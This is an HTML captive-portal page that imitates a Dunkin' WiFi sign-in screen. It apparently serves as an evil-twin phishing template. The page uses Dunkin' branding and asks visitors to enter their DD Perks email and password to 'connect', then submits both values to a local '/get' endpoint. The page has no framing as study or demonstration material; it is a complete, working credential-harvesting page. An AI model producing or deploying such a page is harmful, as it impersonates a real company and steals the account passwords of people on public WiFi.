<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Dunkin' WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Arial Rounded MT Bold","Arial Black",Arial,sans-serif;background:#FF6E1A;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.2)}
.top{background:#FF6E1A;padding:26px 24px 18px;text-align:center}
.brand{font-size:32px;font-weight:900;color:#fff;letter-spacing:-0.5px}
.brand span{color:#FF1493}
.tagline{font-size:10px;font-weight:700;color:rgba(255,255,255,0.8);letter-spacing:2px;text-transform:uppercase;margin-top:5px;font-family:Arial,sans-serif}
.mid{background:#DA1884;padding:8px 24px;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;background:#fff;border-radius:50%;flex-shrink:0}
.mid span{font-size:11px;color:rgba(255,255,255,0.85);font-family:Arial,sans-serif}
.mid strong{color:#fff}
.body{padding:24px 24px 18px;font-family:Arial,sans-serif}
h2{font-size:18px;font-weight:900;color:#FF6E1A;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:4px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#888;margin-bottom:6px;margin-top:18px}
input{width:100%;padding:12px 14px;border:2px solid #FFE0CC;border-radius:8px;font-size:14.5px;background:#fff9f5;color:#1a1a1a;font-family:Arial,sans-serif}
input:focus{outline:none;border-color:#FF6E1A}
input::placeholder{color:#ddd}
.btn{width:100%;padding:13px;margin-top:18px;border:none;border-radius:50px;background:#FF6E1A;color:#fff;font-size:14px;font-weight:900;cursor:pointer;font-family:"Arial Black",Arial,sans-serif}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:12px;line-height:1.6;font-family:Arial,sans-serif}
.terms a{color:#FF6E1A}
.foot{background:#fff9f5;border-top:2px solid #FFE0CC;padding:11px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none;font-family:Arial,sans-serif}
.foot a{color:#FF6E1A}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="brand">Dunkin<span>'</span></div>
    <div class="tagline">America Runs On Dunkin'</div>
  </div>
  <div class="mid"><div class="dot"></div><span>Network: <strong>Dunkin WiFi</strong></span></div>
  <div class="body">
    <h2>Good Morning!</h2>
    <p class="sub">Sign in with your DD Perks account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">CONNECT</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Dunkin' Brands</span><a href="#">Help</a></div>
</div>
</body>
</html>
